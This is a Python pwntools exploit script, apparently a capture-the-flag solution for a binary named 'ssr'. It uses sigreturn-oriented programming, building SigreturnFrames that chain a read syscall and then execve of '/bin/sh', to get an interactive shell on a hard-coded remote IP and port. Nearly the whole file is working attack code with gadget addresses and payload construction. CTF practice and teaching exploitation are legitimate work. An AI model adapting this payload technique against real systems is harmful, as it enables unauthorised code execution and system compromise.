# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64')
binary = './ssr'
elf = ELF(binary)
#libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '1.116.140.142'
    port = '8902'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)


#one_gad = one_gadget(libc.path)
#dbg("*0x0000000004000C0")

data_addr = 0x0000000000600100
start_addr = 0x0000000004000E8
syscall_ret = 0x00000000004000FC

read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = data_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = data_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用

payload =p64(start_addr) + p64(syscall_ret)+ str(read)
# dbg()
se(payload)
se(payload[8:8+15])

execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = data_addr + 0x120
execve.rsi = 0x0 #execve函数二参
execve.rdx = 0x0 #execve函数二参
execve.rsp = data_addr 
execve.rip = syscall_ret

payload = (p64(start_addr) + p64(syscall_ret) + str(execve)).ljust(0x120,'\x00') + '/bin/sh\x00'

raw_input()
se(payload)
se(payload[8:8+15])

p.interactive()

'''
@File    :   ssr.py
@Time    :   2021/11/18 12:24:33
@Author  :   Niyah 
'''